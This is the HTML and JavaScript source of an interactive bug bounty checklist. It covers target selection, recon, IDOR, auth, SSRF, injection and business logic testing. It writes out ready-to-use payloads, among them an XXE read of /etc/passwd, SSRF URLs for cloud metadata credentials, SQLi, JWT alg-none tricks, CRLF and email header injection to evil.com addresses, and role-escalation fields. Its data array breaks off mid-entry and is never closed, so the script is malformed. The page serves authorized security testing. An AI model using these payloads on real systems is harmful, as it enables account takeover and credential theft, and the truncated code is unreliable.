
<style>
*{box-sizing:border-box;margin:0;padding:0}
.wrap{background:#0f0f0f;min-height:100vh;padding:1.25rem;font-family:var(--font-sans);color:#e0e0e0}
.hdr h1{font-size:20px;font-weight:500;color:#f0f0f0;margin-bottom:3px}
.hdr p{font-size:12px;color:#666}
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:14px 0}
.stat{background:#1a1a1a;border:0.5px solid #2a2a2a;border-radius:8px;padding:10px;text-align:center}
.stat-num{font-size:22px;font-weight:500;color:#4ade80}
.stat-label{font-size:11px;color:#555;margin-top:2px}
.prog-bar{height:4px;background:#1e1e1e;border-radius:2px;margin:10px 0 16px}
.prog-fill{height:100%;background:#4ade80;border-radius:2px;transition:width 0.3s}
.top-row{display:flex;align-items:flex-start;gap:8px;flex-wrap:wrap;margin-bottom:14px}
.tabs{display:flex;gap:5px;flex-wrap:wrap;flex:1}
.tab{padding:5px 12px;font-size:12px;border:0.5px solid #2a2a2a;border-radius:20px;cursor:pointer;background:#1a1a1a;color:#888;transition:all 0.15s}
.tab.active{background:#1f1f1f;color:#f0f0f0;border-color:#444}
.reset-btn{padding:5px 12px;font-size:12px;border:0.5px solid #2a2a2a;border-radius:8px;cursor:pointer;background:#1a1a1a;color:#666;white-space:nowrap}
.section{display:none}
.section.active{display:block}
.phase{margin-bottom:1.5rem}
.phase-title{font-size:11px;font-weight:500;color:#555;text-transform:uppercase;letter-spacing:0.08em;margin-bottom:8px;padding-bottom:6px;border-bottom:0.5px solid #1e1e1e}
.item{display:flex;align-items:flex-start;gap:10px;padding:8px 10px;border-radius:6px;margin-bottom:3px;cursor:pointer;transition:background 0.1s;border:0.5px solid transparent}
.item:hover{background:#161616;border-color:#222}
.item.checked{opacity:0.4}
.item.checked .item-text{text-decoration:line-through;color:#555}
.cb{width:17px;height:17px;min-width:17px;border:1.5px solid #333;border-radius:4px;display:flex;align-items:center;justify-content:center;margin-top:2px;transition:all 0.15s;background:#111}
.item:hover .cb{border-color:#555}
.item.checked .cb{background:#4ade80;border-color:#4ade80}
.ck{color:#0f0f0f;font-size:11px;font-weight:700;display:none}
.item.checked .ck{display:block}
.item-text{font-size:13.5px;color:#d0d0d0;line-height:1.5}
.item-sub{font-size:11.5px;color:#555;margin-top:3px;line-height:1.6}
.tag{display:inline-block;padding:1px 7px;border-radius:10px;font-size:10.5px;margin-right:3px;font-weight:500}
.tt{background:#1a2a1a;color:#4ade80;border:0.5px solid #2a3a2a}
.td{background:#2a2010;color:#f59e0b;border:0.5px solid #3a3010}
.tc{background:#2a1a1a;color:#f87171;border:0.5px solid #3a2020}
.tm{background:#1a1a2a;color:#818cf8;border:0.5px solid #2a2a3a}
.tip{background:#1a2228;color:#38bdf8;border:0.5px solid #1e3040}
code{background:#1e1e1e;color:#a3e635;padding:1px 6px;border-radius:3px;font-size:11px;font-family:var(--font-mono)}
</style>
<div class="wrap">
<div class="hdr">
  <h1>Elite bug hunting checklist</h1>
  <p>Complete. Updated with advanced techniques. Check off as you hunt.</p>
</div>
<div class="stats-row">
  <div class="stat"><div class="stat-num" id="sd">0</div><div class="stat-label">done</div></div>
  <div class="stat"><div class="stat-num" id="st" style="color:#888">0</div><div class="stat-label">total</div></div>
  <div class="stat"><div class="stat-num" id="sp">0%</div><div class="stat-label">progress</div></div>
</div>
<div class="prog-bar"><div class="prog-fill" id="pf" style="width:0%"></div></div>
<div class="top-row">
  <div class="tabs" id="tabs"></div>
  <button class="reset-btn" onclick="resetAll()">reset all</button>
</div>
<div id="sections"></div>
</div>
<script>
const D=[
  {tab:"Target selection",phases:[
    {title:"choose your program",items:[
      {t:"Pick program launched in last 3–6 months",s:"Less competition, more untested surface"},
      {t:"Read the entire scope page word by word",s:"Exclusions reveal which bug classes already exist — hunt variants"},
      {t:"Check public vs private program type",s:"Private = fewer hunters = more waiting bugs"},
      {t:"Evaluate scope size vs competition ratio",s:"Large scope + low max bounty = goldmine almost nobody is hunting"},
      {t:"Look for recently acquired company assets in scope",s:"Acquired assets are almost always under-tested"},
      {t:"Read every disclosed report for this program first",s:"Know what's been found — hunt variants not duplicates"},
      {t:"Check program's response time and payout history",s:"Some programs triage fast and pay well — prioritize those"},
    ]},
    {title:"understand the business",items:[
      {t:"What does the company actually do?",s:"B2B vs B2C changes attack surface completely"},
      {t:"Where does money flow in the app?",s:"Payment flows = business logic goldmine"},
      {t:"Map every user role that exists",s:"Admin, staff, user, guest, API user — every role is auth testing surface"},
      {t:"Check job listings for tech stack clues",s:'"Hiring Spring Boot engineers" = Java backend. Job posts leak everything.'},
      {t:"Check LinkedIn for engineering team size",s:"Small team = less security review = more bugs"},
    ]}
  ]},
  {tab:"Passive recon",phases:[
    {title:"subdomain enumeration",items:[
      {t:"Run multiple subdomain tools in parallel",s:'<span class="tag tt">amass</span><span class="tag tt">subfinder</span><span class="tag tt">assetfinder</span><span class="tag tt">chaos</span>'},
      {t:"Certificate transparency logs",s:'<span class="tag td">crt.sh search: %.target.com</span> — finds subdomains before DNS'},
      {t:"DNS resolution of all found subdomains",s:'<span class="tag tt">dnsx</span> <code>cat subs.txt | dnsx -silent -a -resp</code>'},
      {t:"Check for subdomain takeover on all dead subdomains",s:'<span class="tag tc">CRITICAL</span> <span class="tag tt">subjack</span> or <span class="tag tt">nuclei</span> <code>-t takeovers/</code> — dangling DNS to Heroku, GitHub Pages, S3'},
      {t:"Brute force subdomains beyond passive results",s:'<span class="tag tt">puredns</span> <code>puredns brute all.txt target.com -r resolvers.txt</code>'},
    ]},
    {title:"google dorks",items:[
      {t:"Find exposed sensitive files",s:'<span class="tag td">site:target.com filetype:pdf OR xlsx OR docx OR sql OR env OR log</span>'},
      {t:"Find admin and internal panels",s:'<span class="tag td">site:target.com inurl:admin OR inurl:internal OR inurl:dashboard OR inurl:manage</span>'},
      {t:"Find API documentation",s:'<span class="tag td">site:target.com inurl:api OR swagger OR openapi OR graphql OR docs</span>'},
      {t:"Find staging and dev environments",s:'<span class="tag td">site:target.com inurl:staging OR inurl:dev OR inurl:test OR inurl:uat OR inurl:sandbox</span>'},
      {t:"Find login pages",s:'<span class="tag td">site:target.com inurl:login OR inurl:signin OR inurl:auth OR inurl:sso</span>'},
      {t:"Find error pages leaking info",s:'<span class="tag td">site:target.com "sql syntax" OR "stack trace" OR "exception" OR "error occurred"</span>'},
      {t:"Find exposed config files",s:'<span class="tag td">site:target.com ext:xml OR ext:conf OR ext:config OR ext:yml OR ext:yaml OR ext:ini</span>'},
    ]},
    {title:"github dorking",items:[
      {t:"Search for leaked API keys and secrets",s:'<span class="tag td">org:targetcompany api_key OR secret OR password OR token OR credential</span>'},
      {t:"Search for internal endpoints",s:'<span class="tag td">org:targetcompany api.target.com OR internal OR staging.target.com</span>'},
      {t:"Search for hardcoded credentials",s:'<span class="tag td">org:targetcompany "BEGIN RSA" OR "BEGIN PRIVATE KEY" OR "AWS_SECRET"</span>'},
      {t:"Check employee personal repos too",s:"Engineers often commit work code to personal repos — search their usernames"},
      {t:"Check commit history even on empty repos",s:"Secrets deleted in latest commit still exist in git history"},
    ]},
    {title:"other passive sources",items:[
      {t:"Wayback Machine for old endpoints",s:'<span class="tag tt">waybackurls</span> <code>echo target.com | waybackurls | tee wayback.txt</code>'},
      {t:"Shodan for exposed infrastructure",s:'<span class="tag tt">Shodan</span> <span class="tag td">org:"Company Name"</span> — look for exposed Redis, Elasticsearch, Jenkins, Grafana'},
      {t:"Censys for exposed services",s:'Search ASN or company name — finds things Shodan misses'},
      {t:"Check Pastebin for leaked data",s:'<span class="tag td">site:pastebin.com "target.com"</span>'},
      {t:"FOFA / Zoomeye for non-US infra",s:"Better than Shodan for Asian-hosted infrastructure"},
      {t:"Check S3 buckets by guessing names",s:'<span class="tag tt">S3Scanner</span> try: target-backup, target-prod, target-assets, target-static, target-dev'},
    ]}
  ]},
  {tab:"Active recon",phases:[
    {title:"probe live hosts",items:[
      {t:"HTTP probe all subdomains",s:'<span class="tag tt">httpx</span> <code>cat subs.txt | httpx -silent -status-code -title -tech-detect -mc 200,301,302,403,401</code>'},
      {t:"Screenshot all live hosts",s:'<span class="tag tt">gowitness</span> or <span class="tag tt">eyewitness</span> — visual triage at scale, spot the weird ones fast'},
      {t:"Look for outliers: admin panels, login pages, unusual ports",s:"Anything that doesn't look like the main site — investigate first"},
      {t:"Technology fingerprint each host",s:'<span class="tag tt">Wappalyzer</span> browser ext + response headers + cookie names + error messages'},
      {t:"Intentionally trigger errors for stack traces",s:"Wrong content-type, missing params, invalid JSON — errors leak framework version"},
      {t:"Check for debug endpoints",s:'Try: /debug /console /actuator /actuator/env /actuator/heapdump /_debug /phpinfo.php'},
      {t:"Check Spring Boot actuator endpoints",s:'<span class="tag tc">CRITICAL</span> /actuator/env leaks all env vars including secrets. /actuator/heapdump = memory dump with credentials'},
    ]},
    {title:"content discovery",items:[
      {t:"Directory brute force every live host",s:'<span class="tag tt">ffuf</span> <code>ffuf -u https://target.com/FUZZ -w ~/SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302,403 -c</code>'},
      {t:"API endpoint discovery",s:'<span class="tag tt">ffuf</span> <code>ffuf -u https://api.target.com/FUZZ -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt</code>'},
      {t:"Find hidden parameters with Param Miner",s:'Burp extension — right click any request → Guess parameters. Finds hidden params automatically.'},
      {t:"Manual param discovery with arjun",s:'<span class="tag tt">arjun</span> <code>arjun -u https://target.com/api/endpoint --include \'origin,referer\'</code>'},
      {t:"Check robots.txt and sitemap.xml on every subdomain",s:"Devs put internal paths here they think nobody reads"},
      {t:"Check /.git/ /.svn/ /.env/ on all subdomains",s:'<span class="tag tc">CRITICAL</span> Exposed .git = download entire source code. <span class="tag tt">git-dumper</span>'},
      {t:"Check /.well-known/ directory",s:"Security.txt, openid-configuration, jwks.json — leaks auth config"},
      {t:"Find backup files on known filenames",s:'<code>ffuf -u https://target.com/index.FUZZ -w backup_extensions.txt</code> trying .bak .old .backup .orig .copy'},
    ]},
    {title:"javascript analysis",items:[
      {t:"Extract and download all JS files",s:'<span class="tag tt">hakrawler</span> <code>echo target.com | hakrawler -js -depth 3</code>'},
      {t:"Find hidden API endpoints in JS",s:'<span class="tag tt">LinkFinder</span> <code>python linkfinder.py -i https://target.com/app.js -o cli</code>'},
      {t:"Search all JS for secrets",s:'<code>grep -rE "(api_key|apikey|secret|token|password|AWS_|private_key|client_secret)" *.js</code>'},
      {t:"Find S3 bucket names and cloud storage refs",s:'<code>grep -rE "(s3\\.amazonaws|s3://|storage\\.googleapis|blob\\.core\\.windows)" *.js</code>'},
      {t:"Check Wayback Machine for old JS versions",s:"Old JS files contain removed endpoints that still work on the server"},
      {t:"Look for GraphQL schema and mutations in JS",s:'<code>grep -rE "(graphql|mutation|query|__schema|__typename)" *.js</code>'},
      {t:"Find internal IPs and URLs hardcoded in JS",s:'<code>grep -rE "(localhost|127\\.0\\.0|192\\.168|10\\.0\\.|internal)" *.js</code>'},
    ]},
    {title:"api discovery",items:[
      {t:"Check for OpenAPI/Swagger documentation",s:"Try: /api-docs /swagger.json /openapi.json /v1/api-docs /swagger-ui.html"},
      {t:"Search for Postman collections",s:'<span class="tag td">site:target.com postman</span> and <span class="tag td">site:postman.com target.com</span> — teams accidentally publish these'},
      {t:"Test API versioning — old versions less patched",s:"If /api/v3 exists, test /api/v1 /api/v2 /api/v0 /api/beta"},
      {t:"Check for GraphQL endpoint",s:"Try: /graphql /api/graphql /v1/graphql /query — test introspection (see GraphQL tab)"},
      {t:"Install and intercept the mobile app",s:"Mobile hits API endpoints web doesn't. More surface, less competition."},
      {t:"Decompile APK for hidden endpoints",s:'<span class="tag tt">jadx-gui</span> — open APK, search target domain and /api/ — find endpoints not in web app'},
    ]}
  ]},
  {tab:"Map + Setup",phases:[
    {title:"feature mapping — mandatory before hunting",items:[
      {t:"List every single feature of the application",s:"Registration, login, profile, password reset, upload, payment, messaging, export, import, admin, API keys, webhooks..."},
      {t:"Map every user role",s:"Admin, staff, member, guest, API user — what can each do that others cannot?"},
      {t:"Identify all object types",s:"Orders, invoices, messages, documents, reports, tickets — every object = IDOR surface"},
      {t:"Rank features by impact if broken",s:"Payment flow, auth, admin actions = highest. Profile picture = lowest. Start at top."},
      {t:"Create two test accounts (User A and User B)",s:'<span class="tag tc">MANDATORY</span> Never test IDOR or auth without two accounts. Never use real user data.'},
      {t:"Create admin/staff test account if program provides one",s:"Always request elevated test accounts in your program introduction message"},
    ]},
    {title:"burp suite setup",items:[
      {t:"Lock Burp scope to target domain only",s:"Target → Scope → add target. No noise."},
      {t:"Install and configure Autorize extension",s:'<span class="tag tc">CRITICAL</span> Paste User A session cookie in Autorize config. Browse as User B. Every IDOR flagged automatically.'},
      {t:"Install Param Miner",s:"Discovers hidden headers and parameters — runs passively as you browse"},
      {t:"Install Logger++",s:"Advanced request filtering — find that one interesting request in 10,000"},
      {t:"Install JS Miner",s:"Auto-extracts API endpoints from every JS file as you browse"},
      {t:"Browse entire app as a normal user first",s:"Click everything. Use every feature. Let Burp map the full sitemap before you attack anything."},
      {t:"Check Burp sitemap for endpoints you missed manually",s:"Burp catches XHR calls and background API requests your eyes miss"},
    ]}
  ]},
  {tab:"IDOR + Auth",phases:[
    {title:"idor hunting",items:[
      {t:"Find every object ID in the application",s:"Order IDs, invoice IDs, document IDs, message IDs, user IDs, report IDs — list them all"},
      {t:"Test sequential IDs — change to another user's",s:'User A has order 1001. Change to 1000. Can you see User B order? <span class="tag tc">HIGH/CRIT</span>'},
      {t:"Test GUIDs — never assume they are safe",s:"GUIDs leak through other endpoints like activity logs, email links, shared URLs"},
      {t:"Test IDOR on write operations too",s:"Not just read — can you edit, delete, update another user's object?"},
      {t:"Test IDOR in API endpoints not exposed in frontend",s:"POST /api/users/1001 may work even if UI doesn't show it"},
      {t:"Test IDOR on file download endpoints",s:"GET /api/files/download?id=123 — change the ID"},
      {t:"Test mass assignment — add extra fields to every JSON",s:'Profile update: add <code>"role":"admin"</code> <code>"is_admin":true</code> <code>"balance":9999</code> <code>"verified":true</code>'},
      {t:"Check every Autorize yellow/red flag",s:"Every flag = potential IDOR. Investigate all of them before moving on."},
      {t:"Test indirect object references — hashed or encoded IDs",s:"base64 decode any ID that looks encoded. MD5 hash of email or sequential int is common."},
    ]},
    {title:"authentication flaws",items:[
      {t:"Password reset token — is it predictable?",s:"Request multiple resets back to back. Compare tokens. Any pattern?"},
      {t:"Password reset token — does it expire?",s:"Request reset, wait 48h, try the old token. Surprising how often it still works."},
      {t:"Password reset — Host header injection",s:'Change <code>Host:</code> to attacker.com — does reset email link point to your domain? <span class="tag tc">CRITICAL ATO</span>'},
      {t:"Password reset — token leakage in Referer",s:"After clicking reset link, does the page load a third-party resource? Token in Referer header?"},
      {t:"JWT — change algorithm to none",s:'Header: <code>{"alg":"none"}</code> remove signature entirely — does server still accept it?'},
      {t:"JWT — brute force weak secret",s:'<span class="tag tt">hashcat</span> <code>hashcat -a 0 -m 16500 jwt.txt rockyou.txt</code> or <span class="tag tt">jwt_tool</span>'},
      {t:"JWT — kid header injection",s:'<code>"kid":"../../dev/null"</code> or SQL injection in kid param — sign with empty/known secret'},
      {t:"OAuth — missing or unvalidated state parameter",s:"No state = CSRF on OAuth login. Attacker links victim to their auth flow."},
      {t:"OAuth — redirect_uri bypass",s:'Try adding <code>@evil.com</code> <code>?redirect=evil.com</code> <code>evil.com.target.com</code> <code>%0a%0dtarget.com.evil.com</code>'},
      {t:"OAuth — token leakage in Referer",s:"After OAuth redirect, does page load external resources? Access token in Referer?"},
      {t:"2FA bypass — response manipulation",s:'Change <code>{"success":false}</code> to <code>{"success":true}</code> or <code>{"verified":false}</code> to true in 2FA response'},
      {t:"2FA bypass — code reuse",s:"Use same OTP code twice — does second use succeed?"},
      {t:"2FA bypass — skip the step entirely",s:"After entering password, directly request the post-2FA resource. Does server enforce the step?"},
      {t:"Session not invalidated on logout",s:"Copy session token before logout. Logout. Replay token — is it still valid?"},
      {t:"Account takeover via email change without verification",s:"Change email without confirming old email. No verification email sent to old address."},
      {t:"Rate limiting — none on login/OTP/password reset",s:'<span class="tag tt">Burp Intruder</span> — 1000 OTP attempts. Any rate limit? Lockout? <span class="tag tc">HIGH</span>'},
      {t:"Account enumeration via response difference",s:"Does 'email not found' vs 'wrong password' reveal which emails are registered?"},
    ]}
  ]},
  {tab:"SSRF + Inject",phases:[
    {title:"ssrf hunting",items:[
      {t:"Find every feature that fetches a URL you provide",s:"Webhooks, import from URL, link preview, PDF generator, image from URL, integrations, health checks"},
      {t:"Basic SSRF to localhost",s:'Replace URL with <code>http://127.0.0.1</code> <code>http://localhost</code> <code>http://0.0.0.0</code>'},
      {t:"Test AWS metadata endpoint",s:'<span class="tag tc">CRITICAL</span> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>'},
      {t:"Test GCP metadata endpoint",s:'<code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</code>'},
      {t:"Test Azure metadata endpoint",s:'<code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code>'},
      {t:"SSRF filter bypass — IP encoding tricks",s:'Decimal: <code>http://2130706433</code> Octal: <code>http://0177.0.0.1</code> IPv6: <code>http://[::1]</code> Hex: <code>http://0x7f000001</code>'},
      {t:"SSRF filter bypass — DNS rebinding",s:'Use <span class="tag tt">nip.io</span> — <code>http://127.0.0.1.nip.io</code> bypasses domain whitelists'},
      {t:"SSRF filter bypass — redirect chain",s:"Host a redirect on your VPS/Burp Collaborator: 302 → internal IP"},
      {t:"Blind SSRF detection",s:'<span class="tag tt">Burp Collaborator</span> or <span class="tag tt">interactsh</span> — payload your domain, detect DNS/HTTP pingback'},
      {t:"SSRF in PDF generators specifically",s:"HTML-to-PDF with iframe or img src pointing to internal = reliable SSRF vector"},
      {t:"SSRF via URL in XML (combined with XXE)",s:"XXE with external entity to internal HTTP endpoint"},
    ]},
    {title:"injection hunting",items:[
      {t:"Find all XML input points",s:"File uploads accepting .docx .svg .xlsx .xml, API endpoints with Content-Type: application/xml"},
      {t:"Test XXE on every XML input",s:'<code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code>'},
      {t:"Test blind XXE with out-of-band exfil",s:'Use Burp Collaborator URL in XXE SYSTEM entity — detect callback even if no direct output'},
      {t:"Test SSTI in every template-like input",s:'Try: <code>{{7*7}}</code> <code>${7*7}</code> <code>#{7*7}</code> <code>{{7*\'7\'}}</code> — if 49 or 7777777 appears = SSTI <span class="tag tc">CRITICAL RCE</span>'},
      {t:"Test SQLi on every parameter",s:"Add single quote — does it error? Try: <code>' OR '1'='1</code> Time-based: <code>' AND SLEEP(5)--</code>"},
      {t:"Test NoSQLi on JSON/MongoDB apps",s:'Try: <code>{"username":{"$gt":""},"password":{"$gt":""}}</code> in login body'},
      {t:"Test prototype pollution in JS apps",s:'Add <code>__proto__[admin]=true</code> or <code>constructor[prototype][admin]=true</code> as query params'},
      {t:"Test CRLF injection in redirect params",s:'Add <code>%0d%0aSet-Cookie:session=attacker</code> to redirect parameters'},
      {t:"Test email header injection",s:'In contact/invite forms: enter <code>victim@test.com%0ACc:attacker@evil.com</code> as email'},
      {t:"Test HTTP method override",s:"Try X-HTTP-Method-Override: DELETE header on GET requests to restricted endpoints"},
    ]},
    {title:"cors + cache + smuggling",items:[
      {t:"Test CORS misconfiguration on every authenticated endpoint",s:'Set <code>Origin: https://evil.com</code> — does response echo it in Access-Control-Allow-Origin? + ACAO: null?'},
      {t:"Test CORS with null origin",s:'<code>Origin: null</code> — does server respond with <code>Access-Control-Allow-Origin: null</code>? Sandbox iframe exploitable'},
      {t:"Test web cache poisoning via unkeyed headers",s:'<span class="tag tt">Param Miner</span> — finds unkeyed headers. Try X-Forwarded-Host, X-Original-URL, X-Rewrite-URL'},
      {t:"Test HTTP request smuggling (CL.TE / TE.CL)",s:'<span class="tag tt">smuggler.py</span> or <span class="tag tt">Burp HTTP Request Smuggler</span> extension on all HTTP/1.1 endpoints'},
      {t:"Test open redirect on all redirect parameters",s:'<code>redirect= next= url= return_to= goto= continue=</code> — try <code>https://evil.com</code> <code>//evil.com</code> <code>/\\evil.com</code>'},
      {t:"Test clickjacking on sensitive pages",s:"Can the page be framed? Try embedding in iframe. Check X-Frame-Options and CSP frame-ancestors"},
    ]}
  ]},
  {tab:"Business Logic",phases:[
    {title:"payment and workflow logic",items:[
      {t:"Test negative quantities in cart",s:'<code>quantity: -1</code> — does account balance increase? <span class="tag tc">CRITICAL</span>'},
      {t:"Test price manipulation at checkout",s:"Intercept final checkout request, modify price parameter before server receives it"},
      {t:"Test workflow step bypass",s:"3-step checkout: jump step 1 → step 3 directly. Does server enforce sequence?"},
      {t:"Test race conditions on payments",s:'<span class="tag tt">Burp Intruder</span> — send 10 identical purchase requests simultaneously with same payment token'},
      {t:"Test race conditions on coupons and referrals",s:"Apply discount code twice in parallel — use Turbo Intruder for accurate concurrent requests"},
      {t:"Test currency confusion on multi-currency apps",s:"Select cheapest currency for payment, receive in most expensive equivalent"},
      {t:"Test discount stacking and combinability",s:"Apply multiple discount codes — any interaction? Any negative total?"},
      {t:"Test feature access after plan downgrade",s:"Upgrade → use premium feature → downgrade → is feature still accessible?"},
      {t:"Test object state confusion",s:"Cancel an order then complete it. Submit a form twice. What happens to state?"},
    ]},
    {title:"privilege and access logic",items:[
      {t:"Test privilege escalation via role parameter in requests",s:'Profile update: add <code>"role":"admin"</code> or <code>"group":"administrators"</code> to request body'},
      {t:"Test forced browsing to admin functionality",s:"Manually request admin endpoints as regular user — is access enforced server-side?"},

let checked={};
function buildUI(){
  const tabs=document.getElementById('tabs');
  const secs=document.getElementById('sections');
  let total=0;
  D.forEach((sec,si)=>{
    const tab=document.createElement('button');
    tab.className='tab'+(si===0?' active':'');
    tab.textContent=sec.tab;
    tab.onclick=()=>switchTab(si);
    tabs.appendChild(tab);
    const s=document.createElement('div');
    s.className='section'+(si===0?' active':'');
    s.id='s'+si;
    sec.phases.forEach(ph=>{
      const pd=document.createElement('div');
      pd.className='phase';
      const pt=document.createElement('div');
      pt.className='phase-title';
      pt.textContent=ph.title;
      pd.appendChild(pt);
      ph.items.forEach((item,ii)=>{
        total++;
        const id=si+'-'+ii+'-'+ph.title.slice(0,8);
        const div=document.createElement('div');
        div.className='item'+(checked[id]?' checked':'');
        div.dataset.id=id;
        div.onclick=()=>toggle(id,div);
        div.innerHTML=`<div class="cb"><span class="ck">✓</span></div><div style="flex:1"><div class="item-text">${item.t}</div>${item.s?`<div class="item-sub">${item.s}</div>`:''}</div>`;
        pd.appendChild(div);
      });
      s.appendChild(pd);
    });
    secs.appendChild(s);
  });
  document.getElementById('st').textContent=total;
  updateStats();
}
function switchTab(si){
  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',i===si));
  document.querySelectorAll('.section').forEach((s,i)=>s.classList.toggle('active',i===si));
}
function toggle(id,div){
  checked[id]=!checked[id];
  div.classList.toggle('checked',checked[id]);
  updateStats();
}
function updateStats(){
  const done=Object.values(checked).filter(Boolean).length;
  const total=parseInt(document.getElementById('st').textContent);
  document.getElementById('sd').textContent=done;
  document.getElementById('sp').textContent=Math.round(done/total*100)+'%';
  document.getElementById('pf').style.width=(done/total*100)+'%';
}
function resetAll(){
  checked={};
  document.querySelectorAll('.item').forEach(d=>d.classList.remove('checked'));
  updateStats();
}
buildUI();
</script>
